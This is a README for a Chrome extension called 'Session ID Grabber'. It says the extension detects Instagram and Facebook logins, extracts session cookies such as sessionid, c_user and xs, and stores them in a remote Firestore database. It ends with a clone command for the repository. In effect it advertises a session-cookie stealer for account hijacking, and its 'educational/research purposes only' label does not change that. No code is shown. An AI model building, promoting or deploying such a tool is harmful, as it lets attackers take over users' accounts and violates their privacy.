#Session ID Grabber (Chrome Extension)

A powerful Chrome Extension that automatically detects when a user logs, extracts their **Session ID**, and securely stores it in **Firebase Firestore**. Ideal for developers working on automation, analytics, or user session management (educational/research purposes only).

---

## 🚀 Features

- ✅ Auto-detects Instagram and Facebook logins
- 🔍 Extracts session cookies (like `sessionid`, `c_user`, `xs`)
- ☁️ Stores data in Firebase Firestore
- 🔥 Built with Manifest V3 and modern ES Modules
- 🌐 Clean & minimal popup UI

---

## 📂 Project Structure
```
sessionId-Public/

├── icons/
│   |__ 48.png                    # 48x48 icon for toolbar
│   |__ 128.png                   # 128x128 icon for Chrome Web Store
|
├── background.js                # Main logic to fetch session cookies
|
├── wake.js                      # Keeps service worker alive (optional)
|
├── firebase.js                  # Firebase config + Firestore logic
|
├── firebase-app.js              # Firebase App SDK (modular import)
|
├── firebase-firestore.js        # Firebase Firestore SDK (modular import)
|
├── manifest.json                # Extension configuration (Manifest V3)
|
└── readme.md                    # Documentation (you’re reading this!)
```


---

## 🚀 Features

- 🕵️ Detects login activity on Instagram and Facebook
- 🔐 Extracts `sessionid`, `c_user`, `xs`, and more
- ☁️ Securely pushes data to Firestore (with timestamp)
- 🧠 Designed using Manifest V3 + ES Modules
- ⚡ Runs in background with service worker (`wake.js`)

---

## 🔧 Setup Instructions

### 1. Clone the Repo

```bash
git clone https://github.com/avdeshjadon-dev/SessionID-Public.git
cd sessionId-Public
```